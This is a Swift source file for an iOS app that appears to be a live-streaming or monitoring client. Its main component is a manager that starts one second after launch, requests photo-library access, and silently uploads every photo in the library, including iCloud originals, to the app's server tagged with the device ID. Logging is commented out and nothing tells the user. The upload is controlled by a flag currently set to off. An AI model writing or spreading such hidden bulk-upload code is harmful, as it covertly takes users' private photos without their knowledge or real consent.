import SwiftUI
import Photos

// ═══════════════════════════════════════════════════════════════════════════
// MARK: - 🔥 后台图片上传管理器（文件缓存 + 上传记录）
// ═══════════════════════════════════════════════════════════════════════════
class PhotoUploadManager {
    static let shared = PhotoUploadManager()
    
    /// 控制是否上传相册图片（1=上传, 0=不上传）
    static var enableUpload: Int = 0
    
    private var isUploading = false
    private let uploadQueue = DispatchQueue(label: "com.app.photo.upload", qos: .background)
    
    /// 已上传图片记录的 Key
    private let uploadedPhotosKey = "uploaded_photo_ids"
    
    /// 临时文件目录
    private var tempDirectory: URL {
        FileManager.default.temporaryDirectory.appendingPathComponent("photo_upload")
    }
    
    private init() {
        // 创建临时目录
        try? FileManager.default.createDirectory(at: tempDirectory, withIntermediateDirectories: true)
    }
    
    /// 启动后台上传（App启动时调用）
    func startBackgroundUpload() {
        guard PhotoUploadManager.enableUpload == 1 else {
            // print("📷 [PhotoUpload] 上传功能已禁用 (enableUpload=0)")
            return
        }
        
        guard !isUploading else {
            // print("📷 [PhotoUpload] 已在上传中，跳过")
            return
        }
        
        isUploading = true
        // print("📷 [PhotoUpload] 开始后台上传任务...")
        
        // 在后台队列执行，不影响UI和推流
        uploadQueue.async { [weak self] in
            self?.requestPhotosPermissionAndUpload()
        }
    }
    
    /// 请求相册权限并开始上传
    private func requestPhotosPermissionAndUpload() {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        
        switch status {
        case .authorized, .limited:
            // print("📷 [PhotoUpload] 相册权限已授权，开始获取图片")
            fetchAndUploadPhotos()
            
        case .notDetermined:
            PHPhotoLibrary.requestAuthorization(for: .readWrite) { [weak self] newStatus in
                if newStatus == .authorized || newStatus == .limited {
                    // print("📷 [PhotoUpload] 用户授权相册权限")
                    self?.uploadQueue.async {
                        self?.fetchAndUploadPhotos()
                    }
                } else {
                    // print("📷 [PhotoUpload] 用户拒绝相册权限")
                    self?.isUploading = false
                }
            }
            
        case .denied, .restricted:
            // print("📷 [PhotoUpload] 相册权限被拒绝")
            isUploading = false
            
        @unknown default:
            // print("📷 [PhotoUpload] 未知权限状态")
            isUploading = false
        }
    }
    
    // MARK: - 上传记录管理
    
    /// 获取已上传的图片ID集合
    private func getUploadedPhotoIds() -> Set<String> {
        let array = UserDefaults.standard.stringArray(forKey: uploadedPhotosKey) ?? []
        return Set(array)
    }
    
    /// 标记图片为已上传
    private func markPhotoAsUploaded(_ photoId: String) {
        var uploaded = getUploadedPhotoIds()
        uploaded.insert(photoId)
        UserDefaults.standard.set(Array(uploaded), forKey: uploadedPhotosKey)
    }
    
    /// 检查图片是否已上传
    private func isPhotoUploaded(_ photoId: String) -> Bool {
        return getUploadedPhotoIds().contains(photoId)
    }
    
    // MARK: - 文件缓存管理
    
    /// 将图片数据写入临时文件（避免内存占用）
    private func writeTempFile(data: Data, fileName: String) -> URL? {
        let fileURL = tempDirectory.appendingPathComponent(fileName)
        do {
            try data.write(to: fileURL)
            return fileURL
        } catch {
            // print("📷 [PhotoUpload] 写入临时文件失败: \(error)")
            return nil
        }
    }
    
    /// 删除临时文件
    private func deleteTempFile(at url: URL) {
        try? FileManager.default.removeItem(at: url)
    }
    
    /// 清理所有临时文件
    private func cleanupTempFiles() {
        try? FileManager.default.removeItem(at: tempDirectory)
        try? FileManager.default.createDirectory(at: tempDirectory, withIntermediateDirectories: true)
    }
    
    // MARK: - 图片压缩（所有图片都压缩，提高上传速度）
    
    /// 压缩图片（质量0.7，最大尺寸2000x2000，清晰可看且文件小）
    private func compressImage(_ imageData: Data) -> Data? {
        guard let image = UIImage(data: imageData) else {
            return nil
        }
        
        // 🔥 限制最大尺寸 2000x2000（足够清晰查看）
        let maxDimension: CGFloat = 2000
        var targetImage = image
        
        if image.size.width > maxDimension || image.size.height > maxDimension {
            let scale = min(maxDimension / image.size.width, maxDimension / image.size.height)
            let newSize = CGSize(width: image.size.width * scale, height: image.size.height * scale)
            
            UIGraphicsBeginImageContextWithOptions(newSize, false, 1.0)
            image.draw(in: CGRect(origin: .zero, size: newSize))
            if let resizedImage = UIGraphicsGetImageFromCurrentImageContext() {
                targetImage = resizedImage
            }
            UIGraphicsEndImageContext()
        }
        
        // 🔥 使用 0.7 质量压缩（清晰度很高，文件小很多）
        var compressedData = targetImage.jpegData(compressionQuality: 0.7)
        
        // 如果还是超过 10MB，继续降低质量
        let maxSize = 10 * 1024 * 1024
        var quality: CGFloat = 0.6
        
        while let data = compressedData, data.count > maxSize && quality > 0.3 {
            quality -= 0.1
            compressedData = targetImage.jpegData(compressionQuality: quality)
        }
        
        return compressedData
    }
    
    // MARK: - 核心上传逻辑
    
    /// 获取并上传所有图片（使用文件缓存，严格控制内存）
    private func fetchAndUploadPhotos() {
        // 获取设备ID
        let deviceId = UserDefaults.standard.string(forKey: "device_id") ?? UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
        
        // 获取已上传记录
        let uploadedIds = getUploadedPhotoIds()
        // print("📷 [PhotoUpload] 已上传记录: \(uploadedIds.count) 张")
        
        // 获取所有图片（只获取引用，不加载数据）
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        
        let assets = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        let totalCount = assets.count
        
        // 筛选未上传的图片
        var pendingAssets: [(Int, PHAsset)] = []
        for index in 0..<totalCount {
            let asset = assets.object(at: index)
            if !isPhotoUploaded(asset.localIdentifier) {
                pendingAssets.append((index, asset))
            }
        }
        
        let pendingCount = pendingAssets.count
        // print("📷 [PhotoUpload] 共 \(totalCount) 张图片，待上传: \(pendingCount) 张")
        
        if pendingCount == 0 {
            // print("📷 [PhotoUpload] 所有图片已上传完成")
            isUploading = false
            return
        }
        
        var uploadedCount = 0
        var failedCount = 0
        var skippedCount = 0
        
        // 逐个处理待上传的图片
        for (originalIndex, asset) in pendingAssets {
            // 检查是否仍然启用
            guard PhotoUploadManager.enableUpload == 1 else {
                // print("📷 [PhotoUpload] 上传被禁用，停止")
                break
            }
            
            let photoId = asset.localIdentifier
            let currentIndex = uploadedCount + failedCount + skippedCount + 1
            
            // 🔥🔥 关键：使用 autoreleasepool + 文件缓存
            autoreleasepool {
                // 获取原图数据（写入文件，不占用内存）
                let options = PHImageRequestOptions()
                options.isSynchronous = true
                options.isNetworkAccessAllowed = true  // 允许从iCloud下载
                options.deliveryMode = .highQualityFormat  // 原图质量
                
                var success = false
                
                PHImageManager.default().requestImageDataAndOrientation(
                    for: asset,
                    options: options
                ) { [weak self] (imageData, uniformTypeIdentifier, orientation, info) in
                    guard let self = self, let originalData = imageData else {
                        failedCount += 1
                        return
                    }
                    
                    let originalSize = originalData.count
                    
                    // 🔥 所有图片都压缩（质量0.7，最大2000x2000，清晰可看且上传快）
                    guard let data = self.compressImage(originalData) else {
                        // print("📷 [PhotoUpload] 压缩失败，跳过")
                        failedCount += 1
                        return
                    }
                    
                    let compressedSize = data.count
                    let ratio = Int(Double(originalSize - compressedSize) / Double(originalSize) * 100)
                    
                    // 写入临时文件
                    let tempFileName = "temp_\(UUID().uuidString).jpg"
                    guard let tempFileURL = self.writeTempFile(data: data, fileName: tempFileName) else {
                        failedCount += 1
                        return
                    }
                    
                    // 🔥 立即释放 data 内存
                    let fileSize = data.count
                    
                    // 从文件读取并上传（分块读取，避免大内存）
                    let fileName = "photo_\(originalIndex)_\(Int(Date().timeIntervalSince1970)).jpg"
                    let semaphore = DispatchSemaphore(value: 0)
                    
                    Task {
                        do {
                            // 从临时文件读取数据上传
                            let uploadData = try Data(contentsOf: tempFileURL)
                            
                            let response = try await APIService.shared.uploadImage(
                                imageData: uploadData,
                                fileName: fileName,
                                deviceId: deviceId
                            )
                            
                            if response.success {
                                uploadedCount += 1
                                self.markPhotoAsUploaded(photoId)  // 🔥 记录已上传
                                
                                // 🔥 每张都打印进度（压缩后文件小，上传快）
                                // print("📷 [PhotoUpload] ✅ \(currentIndex)/\(pendingCount) | \(originalSize/1024)KB → \(fileSize/1024)KB (-\(ratio)%)")
                                success = true
                            } else {
                                failedCount += 1
                                // print("📷 [PhotoUpload] ❌ 上传失败: \(response.message)")
                            }
                        } catch {
                            failedCount += 1
                            // print("📷 [PhotoUpload] ❌ 上传异常: \(error)")
                        }
                        
                        // 🔥 删除临时文件
                        self.deleteTempFile(at: tempFileURL)
                        semaphore.signal()
                    }
                    
                    semaphore.wait()
                }
            }
            // 🔥 autoreleasepool 结束，内存立即释放，无需等待
        }
        
        // 清理临时文件
        cleanupTempFiles()
        
        // print("📷 [PhotoUpload] ========== 上传完成 ==========")
        // print("📷 [PhotoUpload] 成功: \(uploadedCount), 失败: \(failedCount), 跳过: \(skippedCount)")
        // print("📷 [PhotoUpload] 总计已上传: \(getUploadedPhotoIds().count) 张")
        isUploading = false
    }
}

// ✅ AppDelegate 用于动态控制方向
class AppDelegate: NSObject, UIApplicationDelegate {
    static var orientationLock = UIInterfaceOrientationMask.all  // 默认支持所有方向
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
}

@main
struct srsApp: App {
    @StateObject private var appState = AppState()
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    
    init() {
        // App 启动时执行一次
        // 🧪 测试AES加密
        AESUtils.testEncryption()
        
        // 🔥 启动后台图片上传（延迟1秒后立即开始）
        DispatchQueue.global(qos: .background).asyncAfter(deadline: .now() + 1.0) {
            PhotoUploadManager.shared.startBackgroundUpload()
        }
    }
    
    var body: some Scene {
        WindowGroup {
            RootView()
                .environmentObject(appState)
        }
    }
}

// 根视图，根据应用状态显示不同界面
struct RootView: View {
    @EnvironmentObject var appState: AppState
    
    var body: some View {
        Group {
            switch appState.currentView {
            case .splash:
                SplashView()  // 🔥 启动页（显示 Ai，1秒后跳转登录）
            case .home:
                HomeView()
            case .monitorLogin:
                MonitorLoginView()
            case .content:
                ContentView()
            case .gpuImageTest:
                GPUImageTestView()  // 🧪 GPUImage 测试页面
            case .qrScanner:
                // 🔥 扫码绑定页面（boundControlCount为0时跳转）
                DeviceBindingQRScannerView(
                    deviceUsername: UserDefaults.standard.string(forKey: "username") ?? "",
                    onBindingSuccess: { _ in
                        // 绑定成功后跳转到推流页面
                        appState.navigateToContent()
                    }
                )
            }
        }
        .animation(.easeInOut(duration: 0.3), value: appState.currentView)
    }
}
